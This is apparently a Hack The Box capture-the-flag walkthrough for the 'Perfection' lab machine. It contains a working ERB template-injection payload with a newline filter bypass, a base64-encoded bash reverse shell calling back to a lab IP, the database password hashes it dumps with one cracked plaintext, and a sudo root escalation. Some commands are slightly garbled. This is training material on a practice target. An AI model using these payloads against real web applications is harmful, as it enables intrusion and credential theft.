---
title: Hack The Box - Perfection
date: 2024-12-05 13:33:37
categories:
  - HTB
tags:
  - HTB
comments: true
---

HTB Perfection Machine - https://www.hackthebox.com/machines/perfection

### Scanning & Enumeration
As always, one of the first things we need to do is understand what services the target is hosting. We can do that with the nmap tool
```
sudo nmap -Pn -sC -sV -oA 10.129.216.68
```

The output of the Nmap tool will be:

![720](Pasted%20image%2020260822081454.png)

Since we know the target is hosting a webpage on port 80, so lets visit the site and look around testing input fields.

![984](021_Perfection_-_Easy_Machine_000.png)

Web app version
WEBrick/1.7.0 (Ruby/3.0.2/2021-07-07)

Possible directories
/about
/weighted-grade

Possible users on /about
Susan Miller
Tina Smith

It looks like the only interactive page we have is on /weighted-grade so lets go to that page and see what it does.

### Exploitation & Gaining Access 
When we navigate to the web page we see a table that takes user input. Assuming the "Grade" and "Weight" columns only take integers, I filled out the table with junk data to see how the page handles the input.

![[Pasted image 20250817010606.png]]

After submitting that junk information, all we will see is a message saying: "Please reenter! Weights do not add up to 100." So lets see if we can get it to return something else using command injection.

In the category section
```
asdf;echo "Cat 1!"
```

![[Pasted image 20250817010614.png]]

The results will be:

![[Pasted image 20250817010624.png]]

 

So it looks like the website is checking the sum of the weights before anything else. Lets make one of the weights equal to 100 and see what happens.
![[Pasted image 20250817010639.png]]

The results will be:

![[Pasted image 20250817010650.png]]

We've now confirmed that the site is checking the total weight value before evaluating any other input. The next few tests I tried the following:
```
test || id     // 1st test
test & id      // 2st test
>(id)          // 3st test
test && id     / 4st test
test | id      // 5st test
```

At this point, I decided to open BurpSuite tool and try manipulating the requests directly. Still, every attempt returned "Malicious input blocked." Eventually, I decided to change the order of how the information is submitted and I was then able to inject newlines and get past the filtering.

The actual vulnerability is a server-side template injection.

The following commands and screenshots are the steps I took to obtain a reverse shell.

That payload worked with me
```
category1=a%0A<%25%3Dsystem("ping+-c1+$myIP");%25>
```

![[Pasted image 20250817010802.png]]

ICMP echo from the target box.
```
Sudo tcpdump -i tune0 -A icmp
```

![[Pasted image 20250817010812.png]]

Reverse shell
```
base64 <<< "bash -i >& /dev/tcp/10.10.14.162/1234 0>&1" | sed 's/\+/\%2b/'
```

First, make a listener, to receive our reverse shell on it
```
nc -lnvp 1234
```

The post request in the BurpSuite tool
```
category1=History%0A<%25%3dsystem("echo+$b64+|+base64+-d+|+bash");%25>
```

```
base64 <<< "bash -i >& /dev/tcp/10.10.16.40/1234 0>&1" | sed 's/+/%2b/'
YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNi40MC8xMjM0IDA+JjEK               # replace all + with %2b
```

Second, the final post parameters which will send with BurpSuite
```
grade1=1&weight1=100&category2=N%2FA&grade2=1&weight2=0&category3=N%2FA&grade3=1&weight3=0&category4=N%2FA&grade4=1&weight4=0&category5=N%2FA&grade5=1&weight5=0&category1=a%0A<%25%3dsystem("echo+YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNi40MC8xMjM0IDA%2BJjEK|+base64+-d+|+bash");%25>
```

![[Pasted image 20250817010855.png]]

Note:
- The sed command is used to remove `+` from the base64 string to prevent BurpSuite from thinking, it is a space.

Returning to our listener, we granted a shell

Once we have a shell we can run a quick command to get the first flag.
```
susan@perfection:~/ruby_app$ find / -name "user.txt" -exec cat {} ; 2>/dev/null

or
susan@perfection:~/ruby_app$ cd/home/susan
susan@perfection:~/ruby_app$ cat user.txt
```

#### Enumerating the Target
I started to looking for any potential sensitive data for files that the user has access to, mentions their name, or contains the string "password"

Files owned by the user
```
find / -uid 1001 -type f -ls 2>/dev/null | grep -v "/proc*"
```

![](Pasted%20image%2020260822084907.png)

Files with the name of the user in it
```
find / -name "*susan*" -type f -ls 2>/dev/null  
```

![](Pasted%20image%2020260822084933.png)

To display it
```
cat /var/mail/susan
```

![[Pasted image 20250817011054.png]]

We found an email, it contains information about how passwords are formatted.

Files with the word password in the home directory
```
grep -i password -R .
```

![[Pasted image 20250817011113.png]]

```
strings Migration/pupilpath_credentials.db | grep -i "susan"      # Susan Millerabeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
strings Migration/pupilpath_credentials.db | grep -i "tina"       # Tina Smithdd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57Q
```

Grabbing the Other Users, and their hashes
```
susan@perfection:~/ruby_app$ cd Migration
susan@perfection:~/ruby_app$ strings pupilpath_credentials.db

SQLite format 3
tableusersusers
CREATE TABLE users (
id INTEGER PRIMARY KEY,
name TEXT,
password TEXT
Stephen Locke154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8S
David Lawrenceff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87aP
Harry Tylerd33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393O
Tina Smithdd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57Q
Susan Millerabeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
```

Determine the hash type with hashcat tool, one hash at a time due to the password format
```
hashcat.bin -a 3 abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f susan_nasus_?d?d?d?d?d?d?d?d?d
```

Cracking the password (only showing the user that helped privilege escalation)
```
hashcat.bin -a 3 -m 1400 $hash "susan_nasus_?d?d?d?d?d?d?d?d?d"
hashcat.exe -m 1400 abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f -a 3 susan_nasus_?d?d?d?d?d?d?d?d?d              # susan_nasus_413759210
or
hashcat.exe -m 1400 abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f -a "3 susan_nasus_?d?d?d?d?d?d?d?d?d"
```

### Privilege Escalation
We seen before in the Nmap output, that port 22 is open, so lets use this password via SSH into that box
```
ssh susan@10.10.11.253
the password: susan_nasus_413759210
```

Finding what `susan` user can run as a sudo without a password
```
susan@perfection:~/ruby_app$ sudo -l
susan@perfection:~/ruby_app$ sudo su
```
Once we do, we found that `susan` user is able to act as root.

![](Pasted%20image%2020260822090730.png)

Searching for the root flag
```
susan@perfection:~/ruby_app$ find / -name "root.txt" -exec cat {} \;
```
